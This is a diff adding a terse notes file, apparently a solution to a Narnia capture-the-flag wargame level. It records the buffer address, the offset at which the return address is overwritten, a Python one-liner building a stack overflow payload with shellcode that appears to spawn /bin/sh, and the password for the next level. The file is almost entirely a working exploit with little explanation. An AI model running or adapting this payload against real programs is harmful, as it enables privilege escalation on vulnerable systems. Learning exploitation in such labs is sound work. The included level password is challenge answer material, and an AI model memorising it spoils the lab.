@@ -1,0 +1,9 @@
+buffer address: 0xffffd4d4 -> length: 256
+return address override occur at bytes 264 - 268
+
+# idk the reason but putting the start address of the buffer (which is 0xffffd4c4 will change it to 0xfffffffc), so go 0x10 bytes after that
+# and put 0xffffd4d4
+
+$(python -c 'print "\xb8\x11\x2f\x73\x68\xc1\xe8\x08\x50\x68\x2f\x62\x69\x6e\x54\xb8\x50\xc8\xe4\xf7\xff\xd0" + "A" * 242 + "\xd4\xd4\xff\xff"')
+
+password for narnia5 : faimahchiy
